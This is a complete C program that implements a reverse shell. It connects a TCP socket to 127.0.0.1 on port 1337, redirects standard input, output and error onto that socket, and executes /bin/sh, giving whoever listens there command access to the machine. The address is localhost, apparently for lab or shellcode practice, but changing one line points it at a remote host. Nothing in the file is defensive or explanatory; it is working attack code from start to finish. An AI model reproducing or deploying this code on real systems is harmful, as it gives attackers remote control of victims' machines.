#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main()
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in shell;
    shell.sin_family = AF_INET;
    shell.sin_port = htons(1337);
    shell.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(sock, (struct sockaddr*)&shell, sizeof(struct sockaddr_in));

    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    execl("/bin/sh", "ls", NULL);

}
